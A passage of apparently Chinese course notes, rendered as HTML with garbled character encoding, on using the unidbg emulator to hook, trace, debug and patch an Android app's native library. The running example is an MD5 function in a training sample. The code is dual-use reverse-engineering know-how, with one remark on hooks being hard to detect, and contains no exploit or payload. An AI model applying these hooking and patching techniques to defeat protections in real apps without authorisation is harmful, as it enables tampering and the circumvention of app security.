md5_ctx&quot;</span>);</span><br><span class="line">                Inspector.inspect(plainText.getByteArray(<span class="number">0</span>,length), <span class="string">&quot;plainText&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">64</span>), <span class="string">&quot;preCall md5_ctx&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        hookZz.disable_arm_arm64_b_branch();  <span class="comment">//å¯æœ‰å¯æ— </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨Hookzzè¿›è¡ŒInline-Hook">ä½¿ç”¨Hookzzè¿›è¡ŒInline Hook</h3><p>å…³é”®ï¼šinstrument</p><p>xjbç¬¬28è¯¾æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//addæ–¹æ³•</span></span><br><span class="line">    hookZz.instrument(<span class="keyword">module</span>.base + <span class="number">0x1AEC</span>, <span class="keyword">new</span> <span class="title class_">InstrumentCallback</span>&lt;Arm64RegisterContext&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dbiCall</span><span class="params">(Emulator&lt;?&gt; emulator, Arm64RegisterContext ctx, HookEntryInfo info)</span> &#123; <span class="comment">// é€šè¿‡base+offset inline wrapå†…éƒ¨å‡½æ•°ï¼Œåœ¨IDAçœ‹åˆ°ä¸ºsub_xxxé‚£äº›</span></span><br><span class="line">                System.out.println(<span class="string">&quot;W8=0x&quot;</span> + Integer.toHexString(ctx.getXInt(<span class="number">8</span>)) + <span class="string">&quot;, W9=0x&quot;</span> + Integer.toHexString(ctx.getXInt(<span class="number">9</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ctx.getXInt(8) ==&gt; è·å¾—ç¬¬8ä¸ªå¯„å­˜å™¨çš„å€¼ w8</span></span><br><span class="line"><span class="comment">//Integer.toHexString() ==&gt; æ•´å½¢è½¬åŒ–ä¸ºåå…­è¿›åˆ¶</span></span><br></pre></td></tr></table></figure><h3 id="å‚æ•°çš„è·å–">å‚æ•°çš„è·å–</h3><p>xjbç¬¬29è¯¾æ—¶</p><p>hook jstring2cstr</p><ul><li>ä»¥å†…å­˜å†™å…¥çš„æ–¹å¼ä¼ é€’å‚æ•°ï¼Œå–å‚æ•°æ—¶å°±è¯»å†…å­˜</li><li>ä»¥addLocalObjectæ–¹å¼ä¼ å…¥çš„Javaç±»å‹å‚æ•°ï¼Œå–å‚æ•°æ—¶ç”¨getObject</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// åŠ è½½HookZzï¼Œæ”¯æŒinline hookï¼Œæ–‡æ¡£çœ‹https://github.com/jmpews/HookZz</span></span><br><span class="line">        hookZz.enable_arm_arm64_b_branch(); <span class="comment">// æµ‹è¯•enable_arm_arm64_b_branchï¼Œå¯æœ‰å¯æ— </span></span><br><span class="line">        hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;RegisterContext&gt;() &#123; <span class="comment">// inline wrapå¯¼å‡ºå‡½æ•°</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="comment">//jstr2csträ¸­æ˜¯jstringç±»å‹ å°±åç”¨vm.getObject</span></span><br><span class="line">                 <span class="type">int</span> <span class="variable">intArg</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">1</span>);</span><br><span class="line">                 <span class="type">StringObject</span> <span class="variable">str</span> <span class="operator">=</span> vm.getObject(intArg);</span><br><span class="line">                 System.out.println(<span class="string">&quot;precall str = &quot;</span>+str.getValue());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="comment">//è¾“å‡ºè¿”å›å€¼ å› ä¸ºè¿”å›å€¼åœ¨x0/w0ä¸­</span></span><br><span class="line">                <span class="type">byte</span>[] bytes = ctx.getPointerArg(<span class="number">0</span>).getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">                <span class="comment">//æˆ–è€…ä½¿ç”¨getXPointerä¸‹çš„getStringæ–¹æ³•</span></span><br><span class="line">                String str= ctx.getXPointer(<span class="number">0</span>).getString(<span class="number">0</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;postCall &quot;</span>+str);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        hookZz.disable_arm_arm64_b_branch();  <span class="comment">//å¯æœ‰å¯æ— </span></span><br><span class="line"><span class="comment">//è°ƒç”¨jstc2Cstr</span></span><br><span class="line">        Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>,vm.getJNIEnv(),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng&quot;</span>)));</span><br><span class="line">        Long cstraddr=number.longValue();<span class="comment">//è§‚å¯Ÿè¿™ä¸ªjstring2cstr è¿”å›å€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå†…å®¹æ˜¯åœ°å€ 64ä½ç”¨long</span></span><br><span class="line">    <span class="comment">//å› ä¸ºæ˜¯åœ°å€ï¼Œæ‰€ä»¥è¯»å†…å­˜å–å‚æ•°</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = emulator.getMemory().pointer(cstraddr).getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        Inspector.inspect(bytes,<span class="string">&quot;cstraddr&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡ŒHookzzçš„æ—¶å€™æŠŠç›¸åº”çš„&quot;RegisterContext&quot;æ”¹ä¸ºâ€œHookZzArm64RegisterContextâ€</p><p>è¿™æ—¶å¯ä»¥ä¿®æ”¹å¯„å­˜å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// åŠ è½½HookZzï¼Œæ”¯æŒinline hookï¼Œæ–‡æ¡£çœ‹https://github.com/jmpews/HookZz</span></span><br><span class="line">       hookZz.enable_arm_arm64_b_branch(); <span class="comment">// æµ‹è¯•enable_arm_arm64_b_branchï¼Œå¯æœ‰å¯æ— </span></span><br><span class="line">       hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;HookZzArm64RegisterContext&gt;() &#123; <span class="comment">// inline wrapå¯¼å‡ºå‡½æ•°</span></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookZzArm64RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">intArg</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">1</span>); </span><br><span class="line">                <span class="type">StringObject</span> <span class="variable">str</span> <span class="operator">=</span> vm.getObject(intArg); <span class="comment">//å¯¹è±¡æ˜¯String</span></span><br><span class="line">                System.out.println(<span class="string">&quot;precall str = &quot;</span>+str.getValue());</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookZzArm64RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">               <span class="comment">//ä¿®æ”¹è¿”å›å€¼</span></span><br><span class="line">               <span class="type">int</span> hashcode= vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng~&quot;</span>));</span><br><span class="line">               ctx.setXLong(<span class="number">0</span>,hashcode);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       hookZz.disable_arm_arm64_b_branch();  <span class="comment">//å¯æœ‰å¯æ— </span></span><br><span class="line">       Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>,vm.getJNIEnv(),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng&quot;</span>)));</span><br><span class="line">       <span class="type">int</span> <span class="variable">hashcode</span> <span class="operator">=</span> number.intValue();</span><br><span class="line">       StringObject strResult=vm.getObject(hashcode);</span><br><span class="line">       System.out.println(strResult.getValue());</span><br></pre></td></tr></table></figure><h3 id="hookzz-replace">hookzz replace</h3><p>HOOKæ›¿æ¢(hookzz.replace)</p><ul><li>new ReplaceCallback</li><li>æ›¿æ¢ä»¥åä¾ç„¶å¯ä»¥è°ƒç”¨åŸå‡½æ•°</li><li>ä¸è°ƒç”¨åŸå‡½æ•°çš„è¿”å›è®¾ç½® return <a href="http://HookStatus.LR">HookStatus.LR</a>(emulator,value);</li></ul><p>xjbç¬¬30è¯¾æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator);</span><br><span class="line">            hookZz.replace(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;Java_com_xiaojianbang_ndk_NativeHelper_md5&quot;</span>), <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;  <span class="comment">//contextè·å¾—å‚æ•°å•¥çš„</span></span><br><span class="line">                <span class="comment">//ä¿®æ”¹è¿”å›å€¼ä¸º100ï¼Œæ³¨æ„å¯¹æ­¤å‡½æ•°è°ƒç”¨ä¹Ÿè¿›è¡Œä¸€å®šä¿®æ”¹</span></span><br><span class="line">                <span class="keyword">return</span> HookStatus.LR(emulator,<span class="number">100</span>);</span><br><span class="line">                <span class="comment">//return super.onCall(emulator,context,originFunction); è¿”å›è°ƒç”¨åŸå‡½æ•°</span></span><br><span class="line">                <span class="comment">//return HookStatus.RET(emulator,originFunction);   è¿”å›è°ƒç”¨åŸå‡½æ•°</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">int</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodInt(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// æ‰§è¡ŒJniæ–¹æ³•</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>è°ƒç”¨åŸå‡½æ•°</li></ul><p>return super.onCall(emulator, context, originFunction) ã€Š==ã€‹return HookStatus(emulator, originFunction);</p><h3 id="Dobby">Dobby</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Dobby</span> <span class="variable">dobby</span> <span class="operator">=</span>Dobby.getInstance(emulator); </span><br><span class="line">dobby.replace(address, <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123; </span><br><span class="line">                <span class="comment">//å¦‚ä¸æƒ³æ‰§è¡Œæºç¨‹åºé€»è¾‘ï¼Œå¯ç›´æ¥è¿”å›åˆ°LRå¯„å­˜å™¨ä¸­çš„åœ°å€</span></span><br><span class="line">                HookStatus.RET(emulator,context.getLR());</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator,context,originFunction); è¿”å›è°ƒç”¨åŸå‡½æ•°</span><br><span class="line">                <span class="comment">//return HookStatus.RET(emulator,originFunction);   è¿”å›è°ƒç”¨åŸå‡½æ•°</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="xhook">xhook</h3><p>xhookæ¡†æ¶åªèƒ½å®ç°ç¬¦å·è¡¨çš„hookï¼Œä¼˜ç‚¹æ˜¯ç¨³å®š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IxHook ixHook=XHookImpl.getInstance(emulator);</span><br><span class="line">ixHook.register(soName,ç¬¦å·åï¼Œ<span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>()&#123;</span><br><span class="line">    <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator,context,originFunction); è¿”å›è°ƒç”¨åŸå‡½æ•°</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">&#125;)</span><br><span class="line">ixHook.refresh();</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¼ å…¥çš„å‡½æ•°åç§°æ˜¯åŸå§‹åç§°ï¼Œè€Œä¸æ˜¯ç»è¿‡idaè§£é‡Šåçš„åç§°åœ¨ä½¿ç”¨registeræ–¹æ³•è¿›è¡Œäº†hookä¹‹åï¼Œéœ€è¦ä½¿ç”¨refresh()æ–¹æ³•åˆ·æ–°åï¼Œhookæ‰ç”Ÿæ•ˆ</p><h3 id="åŸç”ŸUnicornHook">åŸç”ŸUnicornHook</h3><p>xjbç¬¬31è¯¾æ—¶</p><ul><li>åŸºäºåŸç”ŸUnicorn APIè¿›è¡Œhookæ—¶ï¼Œ<strong>ä¸éœ€è¦è€ƒè™‘åœ°å€æ˜¯å¦ +1</strong></li><li>åŸç”Ÿunicornçš„HOOKåŠŸèƒ½å¼ºå¤§ <strong>ä¸å®¹æ˜“è¢«æ£€æµ‹</strong></li><li>emulator.getBanked().reg_write(ArmConst.UC_ARM_REG_PC,value) ä¿®æ”¹å¯„å­˜å™¨å€¼ å¦‚æœæ˜¯Thumb è¦åŠ 1</li></ul><p>ä¸‹é¢è¿™ä¸ªHookæ¡†æ¶ï¼šå½“æ‰§è¡Œåˆ°ç‰¹å®šæ±‡ç¼–æŒ‡ä»¤æ—¶ä¼šå›è°ƒå…¥æ¡†æ¶çš„hookæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">emulator.getBackend().hook_add_new(<span class="keyword">new</span> <span class="title class_">CodeHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hook</span><span class="params">(Backend backend, <span class="type">long</span> address, <span class="type">int</span> size, Object user)</span> &#123;</span><br><span class="line">                RegisterContext context=emulator.getContext();</span><br><span class="line">                <span class="keyword">if</span>(address== <span class="keyword">module</span>.base+<span class="number">0x1FF4</span>)&#123;</span><br><span class="line">                    Pointer md5_ctx=context.getPointerArg(<span class="number">0</span>);</span><br><span class="line">                    Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">32</span>),<span class="string">&quot;md5_ctx&quot;</span>);</span><br><span class="line">                    Pointer plainText=context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                    <span class="type">int</span> length=context.getIntArg(<span class="number">2</span>);</span><br><span class="line">                    Inspector.inspect(plainText.getByteArray(<span class="number">0</span>,length),<span class="string">&quot;plainText&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(address== <span class="keyword">module</span>.base+<span class="number">0x2004</span>)&#123;</span><br><span class="line">                    Pointer cipherText=context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                    Inspector.inspect(cipherText.getByteArray(<span class="number">0</span>,<span class="number">16</span>),<span class="string">&quot;cipherText&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAttach</span><span class="params">(UnHook unHook)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">module</span>.base+<span class="number">0x1FE8</span>, <span class="keyword">module</span>.base+<span class="number">0x2004</span>,<span class="literal">null</span> );  <span class="comment">//md5å‡½æ•°ä¸­æ±‡ç¼–æŒ‡ä»¤</span></span><br><span class="line">        <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// æ‰§è¡ŒJniæ–¹æ³•</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result.getValue());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="æ‰“å°è°ƒç”¨æ ˆ">æ‰“å°è°ƒç”¨æ ˆ</h3><p>xjb32è¯¾æ—¶</p><p><code>emulator.getUnwinder().unwind();</code></p><h3 id="unidbgä¸­çš„åŠ¨æ€è°ƒå¼">unidbgä¸­çš„åŠ¨æ€è°ƒå¼</h3><ul><li><p>åŸºäºunicornçš„console debuger åŒæ ·ä¸éœ€è¦ç®¡åœ°å€ +1</p></li><li><p>é™„åŠ ä¸‹æ–­ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Debugger</span> <span class="variable">debugger</span> <span class="operator">=</span> emulator.attach();</span><br><span class="line">debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x1AF4</span>);</span><br><span class="line">debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x1AF8</span>);</span><br></pre></td></tr></table></figure></li><li><p>bï¼šä¸‹ç«¯ç‚¹ b0xåœ°å€</p></li><li><p>mï¼šè¯»å†…å­˜ mx0</p></li><li><p>btï¼šæŸ¥çœ‹å‡½æ•°æ ˆ</p></li><li><p>wï¼šå†™å¯„å­˜å™¨</p></li></ul><h3 id="ç›‘æ§å†…å­˜è¯»å†™">ç›‘æ§å†…å­˜è¯»å†™</h3><p>xjbç¬¬34è¯¾æ—¶</p><ul><li>å°†ä¿¡æ¯è¾“å‡ºåˆ°æ–‡ä»¶</li></ul><p><code>String traceFile=&quot;yourpath&quot;;</code><br><code>PrintStream traceStream = new PrintStream(new FileOutputStream(traceFile),true);</code></p><ul><li>ç›‘æ§å†…å­˜è¯»</li></ul><p><code>emulator.traceRead(module.base, module.base+ module.size).setRedirect(traceStream);</code></p><p>setRedirect(traceStream) é‡å®šå‘åˆ°traceStream</p><ul><li>ç›‘æ§å†…å­˜å†™</li></ul><p><code>emulator.traceWrite(module.base, module.base+ module.size).setRedirect(traceStream);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String traceFile=<span class="string">&quot;yourpath&quot;</span>;   <span class="comment">//å†™å…¥yourpathæ–‡ä»¶</span></span><br><span class="line">       <span class="type">PrintStream</span> <span class="variable">traceStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           traceStream = <span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(traceFile),<span class="literal">true</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">       &#125;</span><br><span class="line">       emulator.traceRead(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line">       emulator.traceWrite(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line">       <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// æ‰§è¡ŒJniæ–¹æ³•</span></span><br><span class="line">       System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result.getValue());</span><br></pre></td></tr></table></figure><h3 id="unidbg-trace">unidbg trace</h3><p>è®°å½•ä»£ç çœŸæ­£æ‰§è¡Œçš„æŒ‡ä»¤å’Œå¯„å­˜å™¨çš„çŠ¶æ€</p><p>ä»£ç å†™æ³•ï¼ˆåŸºæœ¬ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> String traceFile=<span class="string">&quot;yourpath&quot;</span>;</span><br><span class="line">        <span class="type">PrintStream</span> <span class="variable">traceStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span>        <span class="title class_">FileOutputStream</span>(traceFile),<span class="literal">true</span>);</span><br><span class="line">        emulator.traceCode(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line"></span><br><span class="line"><span class="comment">//setRedirect(traceStream); é‡å®šå‘</span></span><br></pre></td></tr></table></figure><h3 id="unidbg-patch">unidbg patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span>UnidbgPointer.pointer(emulator,ç›®æ ‡åœ°å€);</span><br><span class="line"><span class="type">byte</span>[] code=<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x1</span>,<span class="number">0x2</span>&#125;;</span><br><span class="line">pointer.write(code);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬è‡ªåŠ¨æŠŠæ±‡ç¼–ä»£ç å˜ä¸ºæœºå™¨ç ï¼Œç„¶åpatch</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span>UnidbgPointer.pointer(emulator,ç›®æ ‡åœ°å€);</span><br><span class="line"><span class="type">Keystone</span> <span class="variable">keystone</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Keystone</span>(KeystoneArchitecture.Arm,KeystoneMode.ArmThumb);</span><br><span class="line">String s=<span class="string">&quot;subs r0,r2,r3&quot;</span>;</span><br><span class="line"><span class="type">byte</span>[] code=keystone.assemble(s).getMachineCode();</span><br><span class="line">pointer.write(code);</span><br></pre></td></tr></table></figure><h3 id="å¤„ç†soè°ƒç”¨è‡ªå†™çš„Javaç±»1">å¤„ç†soè°ƒç”¨è‡ªå†™çš„Javaç±»1</h3><p>xjb37è¯¾æ—¶</p><ul><li>å°†è‡ªå†™çš„javaç±» æ”¾åˆ°unidbgå·¥ç¨‹ä¸­</li><li>åŒ…åæœ€å¥½ä¸åŸåŒ…åä¸€è‡´</li><li>ç±»ä¸­æœ‰ç”¨åˆ°androidç›¸å…³ç±» éœ€è¦ç”¨Javaå®ç°</li><li>ä»£ç ä¸éœ€è¦å®Œå…¨ä¸€è‡´ åªéœ€å‡½æ•°å¤„ç†ç»“æœç¬¦åˆé¢„æœŸå³å¯</li><li>è®¿é—®ä¿®é¥°ç¬¦çš„é—®é¢˜<br>1.JNIè°ƒç”¨Javaå‡½æ•°ä¸éœ€è¦ç†ä¼šè®¿é—®ä¿®é¥°ç¬¦<br>2.unidbgç”¨Javaå¼€å‘ åœ¨è°ƒç”¨å‡½æ•°æ—¶éœ€è¦æ³¨æ„è®¿é—®ä¿®é¥°ç¬¦<br>3.è§£å†³æ–¹æ³•å¯ä»¥ç”¨åå°„ æˆ–è€…ç›´æ¥å°†privateæ”¹ä¸ºpublic</li></ul><h3 id="Unidbgæ¡ˆä¾‹">Unidbgæ¡ˆä¾‹</h3><p>xjbç¬¬41è¯¾æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 